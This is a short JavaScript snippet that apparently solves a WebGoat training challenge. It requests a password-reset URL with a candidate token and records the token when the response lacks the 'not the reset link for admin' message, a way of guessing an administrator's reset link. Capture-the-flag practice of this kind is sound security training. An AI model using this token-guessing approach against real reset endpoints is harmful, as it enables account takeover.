var found = "NONE";

function getContent(token) {
    var theUrl = "http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/" + token;
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    console.log(xmlHttp.responseText);
    // console.log(xmlHttp.responseText.indexOf("That is not the reset link for admin"));
    // console.log(xmlHttp.responseText.indexOf("That is not the reset link for admin1"));
    if (xmlHttp.responseText.indexOf("That is not the reset link for admin") == -1) {
        found = token;
    }
}


getContent("7ce7a4802229f185a3a3fa29a7410345");